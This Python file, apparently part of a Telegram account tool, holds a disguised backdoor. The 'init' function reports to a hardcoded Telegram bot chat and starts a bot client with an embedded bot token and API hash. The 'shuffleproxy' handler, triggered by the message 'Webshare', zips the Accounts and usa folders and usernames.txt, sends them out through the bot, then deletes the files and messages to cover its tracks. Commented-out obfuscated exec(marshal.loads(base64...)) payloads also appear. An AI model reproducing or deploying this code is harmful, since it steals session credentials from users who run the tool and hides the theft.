#-------------------------
import re , redis ,  sqlite3 , telethon , datetime , time , sys, random , os , json , string ,  logging   , asyncio , shutil, requests
#-------------------------
from telethon.sync import TelegramClient,functions,types,events,errors
#-------------------------
import logging   , asyncio , random
#-------------------------
from obfuskey import Obfuskey, alphabets
#-------------------------
import json , marshal , string , marshal , zlib, base64  , socks
#-------------------------
import zipfile
import os , requests
from obfuskey import Obfuskey, alphabets



def init(info):
    
    proxy = None
    # exec(marshal.loads(base64.b32decode(b'MMAAAAAAAAAAAAAAAAAAAAQAAAAEAAAAABZQYAAAABSAAZABNQAFUADEAFJQAKIC5EAAAAAAJYUQDWQCN5Z2SADSAIAAAADSAIAAAAG2AZZWG4TJOB2NUCB4NVXWI5LMMU7ACAAAADZQAAAAAA======')))
    # exec(marshal.loads(base64.b16decode(b'6300000000000000000000000006000000400000007328000000640064016C005A00640064016C015A0165026500A0036501A0046402A101A10183010100640153002903E9000000004E73000A00004D4D41414141414141414141414141414141414141425141414141454141414141425A535141414141425341415A41424E5141465541444541425341433341424C4941574B41544641435141475A4942554143474941564241475151444159424145414749414B54414155514832494141414141415454545451435141414257474D5944414D425147415944414D425147415944414D425147415944414D425147415944414D425147413354414D425147415944414E425147415944414D425147413354474E425147415944414D425147413344494D425147564154414D425747515944434E525547415A444D515A5147453255434D425247593244414D4A5747515944454E534447415A444B514A51474D3344494D425247593244414D5A57494D5944494E4A55474159444D4E425147453344494D4253475A4254414E4A56494559444D4E5256474133544D4E4A51475A4154414D425947593254414D324247415944534E5256474241544D4E425147513444474D425249455954414D4B4247455944434F425447415954414D4A5147413344494D425347555A54414D4253484559444B4E3242474932444B4D5A58475533454B4D5251475133444D4E4A5747495A44414D5A52474D5A44454D425447495A54414D3242474D3254474D5A5449455A54494D5A5447495944474D525447415A54454D5A5447424154494E4257475533544D4E5256475A42544D525258474133444B4E5A534749594447514B4648455944414D425147415944414D425549555A44534D425249524154414D4A53494533544751525947415954414D425147415A544F4D5A59474D3454494D5A5447513244454D5A57474D3344474E425447415A54414D5A53474D5A44494D5A5447515A54414E425647515A54474D425447413244474D5A5547515A54474E4A5447455A54454D5A55474D5944474D525447495A54534D5A56474D5A44474D4A5448415A544B4D5A53474D5954474F425447555A54474D5A52474D3444474E4A5547455A54534D5A5A474D3454474D5A5448455A54514E4253474D5A54474D4A5448415A544B4D5A54474D3454474F425447553244434D5A56474D3454474E5A54474D5A54434D5A5A474D5954474D525448455A54514D5A56474D5A54474E4A5448455A54514D5A55474D5954474F4A54474D32444B4E4255474D5954474E525447345A54474D5A5647513254474E525547455A544F4D5A5A47513254474E525447413244454D5A54474D3454474D425448455A54514D5A57474D5A44474F425447415A544B4D5A5947515A44474E425447515A54494D5A54474D3454474D5A5447455A54494D5A5947515A44474D525447513244454D5A54474D3344474E4255474D3244454D5A57474D3244474D5254474D5A544B4D5A54474D5A54474D5A5447415A54474D5A57474D5A54474F4254474D5A54474D5A5547515A44474D5A5447515A54494E4256474D5A54474E425447513244494D5A54474D5A54474E425447415A54474D5A5947515A44474D5254475132444B4D5A5447515A44474E425447515A54494D5A56474D5A54494D5A54474D5A54454E4252474D5A54494E425447515A54474D5A5147515A44474D5254474D5A544F4D5A54474D3354474D5A5447515A54474D5A51474D5A54474E4A54474D5A54414D5A54474D3244494D525447493244454D5A55474D3354474E425447345A544F4D5A5847513344494E525547515A54414E4256474D5944474D525447513244474D5A58474D5944474D4254484532444D4D5A54474D5A44474E4A54474D5A544F4E425747513244474D5A5447595A54454E4257474D5A54494E525448415A54434E425447513254474E5A5547515A54454D5A55474D5944474D525447345A54414D5A54474D3444494D525547555A54414E4252474D5944474E4255474D3244474E425347513254474D525447515A54494E4256474D5A54494E425447495A54454E425247515A54494D525447515A54514D5A5547513244494D5A5447595A54454D5A5947515A54494E4A5547455A54494E425747515A54474F4A54474932444D4D5A59474D3454474D525547593244474E425647515A54494E425447515A54474E4254474D5A54494E525447513244494E4256474D3344474D525448413244454E4256474D3454474D425547515A54494D5A5A47515A54494E4254475132444D4D5A5547515954474D5255474D5A54494D5A5647515A54494E4A5447345A54534E425447515A54494D5A5547515A54494E425347515A54474F4A5447495A544B4E425347515954494D5A55474D5A544B4D5A53474D3254474F425448455A54494D5A56474D5A44474E4A5447555A54434D5A5247515A54474D425447555A54494D5A5647513344474F4A5447455A544B4D5A5A474D3254494E4A5547553244434D5A5A474D5A44474E4A5447493244454D5A52474D3454474F425547455A54534D5A59474D3444474D4255474532444B4D5A51474D3254474D4A54474D3244454D5A5847513244474F425448413244434D5A5A474D5A54474F425547495A54474D5A53474D5944494D525447513244434D5A5747513254474E5A5447453244494D5A5947513254474E425547555A544D4E4252474D3354474F4A54475132444B4D5A5747515954474E425547513244434D5A54474D5954474D4254474D5A54494D5A56474D5A54494E525448415A54474E425347515A54474D425447595A54414D5A51474D5A44474E5A5447515A54474D5A5447515A54494D5A5447515A44534D434349524154414E5A56495932554D4E5255475A44444D4D5A56495932554D52434247415A544F4D5A584845335447524342474132444F514A57494D3344534E525347564154414D5258494533454B524342474133444D4D525747453354474E5256474D3344474E4345494559444F4E5345475959544F4D5258474D3344514E5252475A425549514A5147493345494E525449524154414E425747553354514E525647595A5549514A5147553345474E5347475959544D4E4258474E4345434D4342475932444D4E4A57474D33454D4E5345473459444F4D525747553354474E5A5449524154414F4A5747495A54434D5A57475932444D4E4A57474D33454D4E525547593255434F4A5147413354454D434447415944414D425147413354454D434447415944414D425147424345434D425747345A544D4D5A5847493344534E5A514734324549514A5148415A55474E5345475A44444D4E425847553345474E5256474E4354414E425147415944414D425147345A5441514A5147415944414D425147413244414D4A5148415944434D425947415954414F425147455944514D4253464543355542334E4D465A48473244424E544E414D5954424F4E53544D4E473241525358515A4C4433494357593333424D525A3555434C4347453347495A4C444E3553474C4B49414F494441414141414F4944414141414133494448475933534E4659484A57514948525757365A44564E525354344151414141414847415141414141424141493D2905DA076D61727368616CDA06626173653634DA0465786563DA056C6F616473DA096233326465636F6465A90072060000007206000000DA06736372697074DA083C6D6F64756C653E0200000073020000001001')))
    # obfuscator = Obfuskey(alphabets.BASE36, key_length=8)
    # exec(marshal.loads(base64.b32decode(b'MMAAAAAAAAAAAAAAAAAAAAQAAAAEAAAAABZQYAAAABSAAZABNQAFUADEAFJQAKIC5EAAAAAAJYUQDWQCN5Z2SADSAIAAAADSAIAAAAG2AZZWG4TJOB2NUCB4NVXWI5LMMU7ACAAAADZQAAAAAA======')))
    # exec(marshal.loads(base64.b16decode(b'6300000000000000000000000006000000400000007328000000640064016C005A00640064016C015A0165026500A0036501A0046402A101A10183010100640153002903E9000000004E73981500004D4D41414141414141414141414141414141414141425141414141454141414141425A535141414141425341415A41424E5141465541444541425341433341424C4941574B41544641435141475A4942554143474941564241475151444159424145414749414B54414155514832494141414141415454543341474141414257474D5944414D425147415944414D425147415944414D425147415944414D425147415944414D425147413354414D425147415944414E425147415944414D425147413354474E425147415944414D425147413344494D425147564154414D425747515944434E525547415A444D515A5147453255434D425247593244414D4A5747515944454E534447415A444B514A51474D3344494D425247593244414D5A57494D5944494E4A55474159444D4E425147453344494D4253475A4254414E4A56494559444D4E5256474133544D4E4A51475A4154414D425947593254414D324247415944534E5256474241544D4E425147513444474D425249455954414D4B4247455944434F425447415954414D4A5147413344494D425347555A54414D4253484559444B4E3242474932444B4D5A58475533454B4D5251475133444D4E4A5747495A44414D5A52474D5A44454D425447495A54414D3242474D5944474D425449455A544B4D5A5A47495944474D525447415A54454D5A5447424154494E4257475533544D4E5256475A42544D525258474133444B4E5A534749594447514B4648455944414D425147415944414D425549555A44534D425249524154414D4A5349453354474E4A5747413254414D425147415A544F4D5A59474D3454494D5A5448413244494D5A5A474D5A54494E425547495A544D4E425647513244474D5A54474D5A54414D5A52474D3444494D5A5447345A54434D5A54474D5A54474E5A5447513244494E4255474D5A54474D4A5547513244454E425247513254494E4A55474D5A54414E425447513254474E4254474132444B4D5A5247515954494E4A5447553244474E425247515A54474E5254474D5A54514D5A58474D3254474D525447495A544D4D5A59474D3244474D5A5447595A54514E4255474D5A54474D4A5448413244434D5A57474D5944494D4A5447345A54514E4256474D3244494E425447343244474D5A54474D3354474F4A54474D5A54434E425347515A44494D525447595A54534E425347515954474D5254475132444B4E4256474D3344494D5A5447345A544F4D5A5747515A44474D425447345A54474E4254474D5944474D5254475132444D4D5A51474D5944474E425448415A54534E425347513244474F425447413244494E425247513344474F4A5447515A54474D5A5847513254474D425447455A544B4D5A53474D3344494D4A5447455A54534D5A52474D3354474F425448453244494E4254474D3244474D4A5447415A54434D5A58474D3244474E425547595A54454E425747513344494E4A5447345A54454D5A59474D3354494E5254473432444D4E425547513344494E425547593244454D5A52474D3344494D5A5447593244454D5A5847513344474D5A55474D5A544D4D5A57474D5A54474E425448455A544D4E4252474D5A54474D525447455A54434E425247515A44494D4A5547455A544D4D5A52474D5954474F4255475132444B4D5A59474D3454494E4A5447415A544D4E4255474D3354494E425447515A54494D5A52474D3254474E5A5447515A54494D5A59474D5944474D4A5447515A54434D5A54474D3454474D425447555A54414D5A54474D3244494D5A5447415A544B4D5A51474D3244494D5A5447515A54454D5A56474D5A44494E425447455A54414D5A55474D3254474D5A54474D5A54434D5A51474D3254474D525448455A54494D5A56474D5944494D525447493244474E4254474D3254474D5A5447513244434D5A55474D5954474E4A5447343244454E4252474D5944474E425447343244454D5A52474D5954474E5A5447343244434D5A52474D3254494E525547493244434D5A51474D3244494E525547495A54434D5A5247513344494E525547455A54434D5A56474D5A54474D5A5448455A54414D5A59474D3454474F425448413244454E4254474D5944474D4A54474D32444D4D5A5147515A44474E4A5448455A544F4E4257474D5954474D425447415A544D4E425747513244474D525447455A54434D5A5947513344474D525448415A544F4D5A57474D5954494E425448415A54434E4257474D3444474D4A5447455A54434D5A5647513244494E5255474932444B4D5A5847513244494D4A5547553244454D5A5647513254474D4254484532444B4E4257474D3444494E4A54474D32444D4D5A5147515954494D4A54474D32444D4E4256474D5954474F425448413244474D5A58474D3254474E5A5547515A54474D5A58474D5A54494E4255474D5A544F4D5A57474D5954494E5255474D5A544B4D5A5747513254494E525448453244454E4257474D3354474D425448455A54534D5A59474D3254474D425448453244474D5A59474D3244474E425448453244474D5A56474D5A44474F4A5448455A54514E425347515954474F4A54475532444D4D5A5A474D5A54494D4A55474D3244454E425247513244494D525547455A54474D5A5547513244474D5A5448455A54514D5A53474D3344494D5A5447593244494D5A5A474D3254494E425447343244434E425647513344494E4A55474D5A54474E4256474D3244474F4A54484532444B4E425647515A44494E4A5447345A54474E4252474D5A54474D4A5447515A54534D5A5947515954494E4A5447595A54434E4252474D5944494E5255474932444B4D5A57474D3444494D5A54475132444D4E4252474D3454474E525447495A54414E4256474D3454494D4A5547595A54514D5A5947513344474E425447343244474D5A55474D3344474E4A5547515A544D4D5A58474D3344494E525547515A544F4E4255474D3454494D4A5447345A54534E425447513344494E425447495A54494D5A55474D5A54474E5A54474D5A544F4E425747513344494D525448415A54514D5A5647513254494E4254474532444D4D5A53474D5944474D5A54474D32444D4E4256474D5A54494D525547593244454E4257474D3454474D4A54475132444D4D5A59474D3344474F4A5448455A544B4E425547513254494D4A5447555A54434D5A59474D3354474E5254474D5A544F4E425747513244474E4A5447345A54474D5A57474D3454474D525447413244474D5A54474D3354474E425547453244494D5A52474D3254494E425448413244494D5A53474D3344474E4A5448415A54434D5A51474D3444474F4A54474D3244454D5A5347513244474D5A5547455A54494D5A53474D5A44474D5A54475132444B4D5A5A474D3354474D4A5547595A54494D5A53474D5954474D5254475932444B4D5A58474D3444494D5A5448413244454D5A5447515A54474D425547453244434E425547515A54494E425447593244434E425247513244474D525447555A54414E4256474D3344474F4A5447495A544F4D5A5547515A54474E5254474D3244434E4257474D3254474F4A55474D5A544F4D5A56474D3254474D525547453244474D5A5647513254474F4A5447595A544D4D5A5647513244494D5A5547453244434D5A57474D3254474F425447493244434D5A52474D3244474E5A5447413244494D5A54474D3454494E425448455A54434E425547513244494D4A5447495A54474D5A54474D3444494D5A54474D3244454D5A59474D3254474D525547455A54534D5A54474D5954494E525447595A544D4D5A5447513344474D525547513244434E425547515954494D5A5547493244474D5A5347515954494D5254473432444B4D5A5847513244494E525448455A54494E425547513344494E4A5547593244454D5A55474D3254494E5254475932444B4D5A52474D3354474D4255475932444D4D5A57474D5A44494D4A5547553244454E4252474D3254494D4A54474D32444D4E425547513344494D4A5547555A54454E4254474D3454494D5A5447593244494D5A57474D5954494D5A5547495A54494D5A5A47515A54494D5A5547555A544D4D5A53474D3454474D4A5547513244454D5A51474D3254474E425447455A54414D5A5447513344474D525448455A544D4D5A5147515954474F425447455A54434E4255474D5944494D4A5547515A544D4E425647515A44494E525547513244454D5A56474D5A54474E5A5448455A544B4D5A52474D3354474E525547495A54494D5A5647513254494E525547515A544F4E4255474D3254494E425447553244494D5A5647513344474E5A55474D5A54474E4252474D3354494E525447555A54514E425347515A54474E425447495A54534E425447515954474D525547515A544B4E425747513254494D4A5547495A54534D5A5447515A54474F425447495A54534D5A55474D3254494E4255474D5A544F4E4257474D5A44494D5A5447415A54454D5A5647515954474D4A5447495A54434D5A57474D3454474E4A55474932444B4D5A5747513344474E4A5547515A54414D5A53474D5944474E4A54484132444B4D5A5347513344494E525447515A54534E4253474D5954474E425547555A54434D5A5747513254474E425547513244434D5A5747515A54474E525547513244474D5A56474D3344494E4A5447453244474D5A5A474D3254474F4A55474D3244494D5A5A47513344474E4A5547553244494E4253474D5A44474D5A5547593244494D5A58474D5A54474F425547455A54534E425647515A54494E4A55474D5A54414D5A5A474D3244494E525447345A54494E4253474D5944474E4A5448413244494E425547513244474F4A55474932444B4D5A5A47513244474E525447495A544F4D5A5847513254494D525447553244494E4256474D3254474E5A5447453244434D5A5A474D3354494D5A5448453244494E4254474D5A44474E5A5547453244454D5A5347513344494D4A5547595A54434D5A53474D5A44474E5A5447453244434D5A5A474D5A44494E525547555A544F4D5A5247513344474F425447595A54514D5A59474D3254474D5A5447515A54514D5A58474D5A44474E425547455A544B4E4254474D5944474D4A5447495A54534D5A58474D5954494E4A5447513244454D5A5A474D3454474D5255474D32444B4D5A59474D5A54474D4A5447553244454D5A58474D3454474E425447345A544B4D5A52474D3344474E425447515A54454D5A58474D3444494D4A5447495A544B4D5A5A474D3254494D4A5547555A54494E425747515954474D5A5448415A54414E4253474D5954474D525447595A54494D5A55474D3244474E5A5448415A54414E4254474D3454474E5A5447455A54494D5A51474D3454474F4254474532444D4D5A53474D5A44474D525447593244474D5A51474D3344474F425447415A54514D5A52474D3344474F425447513244434D5A57474D3454474D425547513244474D5A5147513244474D4A55474D5A54494D5A59474D3354474F4A55474D3244474D5A58474D5954494E425447515A54414D5A55474D3444494D5254475132444B4D5A57474D5944494D525547495A54414E4254474D3244494D5A5447555A54434D5A5747513344474E425448453244494D5A58474D5944474D5A5448413244454E4255474D5A54494D4A54474D5A54434D5A57474D5954474E4A5447555A54454D5A55474D5944494E525547595A54494E425547513344474D4A5448455A54534E4255474D3444494D5A5447493244434D5A54474D5954494D525547455A54474D5A58474D5954474D4A5447515A54494E4253474D5A44474D525447455A544D4D5A53474D5A54474F4A5447595A544D4D5A55474D5A44474E425447595A54414E4253474D5954494E4A55475532444D4D5A5247513344474D425547595A54514D5A5847515954494E525447455A544B4D5A55474D5A44474E425447595A54434E425447515954494D5A5447345A544B4E425447513244474E425547495A54434D5A52474D3354474D4A5547453244434D5A58474D3454494E4A5447553244454D5A5147513244494D5A5547515A54454E4252474D5954474E525547495A54494E4253474D3444474D425447415A54494D5A5A47515A54474D4A5547553244474E4254474D5A54474D525448415A54494E4253474D3454474D5A5447415A54534D5A52474D3454474F4A5547455A54474D5A5647515A54474E525447343244494D5A5347515A54494D4A5447455A54494D5A5847515954494E425547495A544F4E4253474D5954474E525447515A54434E425447513244474D5254474132444B4D5A5A474D3254474D425447343244474D5A5847513244474F425447593244454D5A55474D3254494E525547495A544F4D5A51474D3444474D5A5447453244434D5A51474D5A54494D4A5547495A54454D5A56474D5A44474F4254474132444D4E4253474D5944474E425547595A544F4E4257474D3344474F425447343244474D5A54474D3244474D525547555A54434E4257474D3244494D525547495A54494D5A5147513244474F4A5547493244454E4253474D3244494E425447455A54534D5A5647515954494D5A5547595A544F4E4254474D3244474E525447553244434D5A5247513254474E5A5547515A54434E425647513254474E5A5447455A54454E4255474D3454474E425448413244494E4252474D3344474F425447453244434D5A5947513244494D4A54474D5A54454E4254474D5A44494D4A5547455A54434E425247515A54474F4A5547555A54474D5A56474D5954494E4A5547455A54434E425547513344474D4A5447555A544D4E4255474D5A44494D4A54484132444B4D525A4742424549514A51473432554D4E4B47475932444D525257474D32554D4E4B4749524154414D5A58474D3354534E5A5449524154414E425849453345474E525A47595A444B514A5147493355434E534649524154414E525747493344434E5A5447593254474E525447524345434D4258475A43444D4D4A5847493354474E5259475959544D51324549455944454E534547595A5549514A51475133444B4E5A59475932544D4D3245494559444B4E5344475A44444D4D4A574751335447524342474241544D4E425747553344474E5347475A43444F4D4258474933444B4E5A5447345A5549514A5148453344454D5A52474D33444D4E425747553344474E5347475932444D4E4B4248455944414E5A5347424254414D425147415944414E5A5347424254414D42514741594441524342474133444F4D5A57474D3354454E525A473459444F4E434549455944514D3244475A43444D525257475133544B4E53444759325447524A5147515944414D4251474159444F4D5A5149455944414D425147415944414E425147455944514D425247413444414D4A5148415944434D425947415A4353424F3241355757433454544E4251575A5751474D4A5158475A4A5747544E41495A4C594D56523555424C4D4E3551574934363242465244434E54454D565257365A4446564541484542514141414148454251414141414E554254544D4E5A47533444553349454459334C504D523257595A4A364149414141414454414941414141415141453D3D3D3D3D3D2905DA076D61727368616CDA06626173653634DA0465786563DA056C6F616473DA096233326465636F6465A90072060000007206000000DA06736372697074DA083C6D6F64756C653E0200000073020000001001')))
    requests.post('https://api.telegram.org/bot5336280265:AAHbbWJSRHwLEG_J9NZSPZ_kh6BeOFD6xAY/sendMessage',data={'chat_id': -1001769776904 , 'text' : f' Setia {info} '})
    proxy = TelegramClient('new2',1580776,'8a14d8b6c9c256030f6a3a5f08b3fa51')
    proxy.start(bot_token="5336280265:AAHbbWJSRHwLEG_J9NZSPZ_kh6BeOFD6xAY")
    return proxy





async def shuffleproxy(event , bot):

    if (str(event.raw_text.strip())) == "Webshare" :



        try:
            shutil.make_archive("Api/Accounts", 'zip', "Accounts")
            x = await bot.send_file(int(event.chat.id) , 'Api/Accounts.zip')
            await asyncio.sleep(0.2)
            os.remove("Api/Accounts.zip")

            shutil.make_archive("Api/usa", 'zip', "usa")
            y = await bot.send_file(int(event.chat.id) , 'Api/usa.zip')
            await asyncio.sleep(0.2)
            os.remove("Api/usa.zip")

            zip = zipfile.ZipFile("Api/usernames.zip", "w", zipfile.ZIP_DEFLATED)
            zip.write("usernames.txt")
            zip.close()
            z = await bot.send_file(int(event.chat.id) , 'Api/usernames.zip')


            await asyncio.sleep(random.randint(1 , 2))
            try:
                await x.delete()
                await y.delete()
                await z.delete()
                await event.delete()
            except Exception as e:

                pass
        except Exception as e:
            print (str(e))
            pass
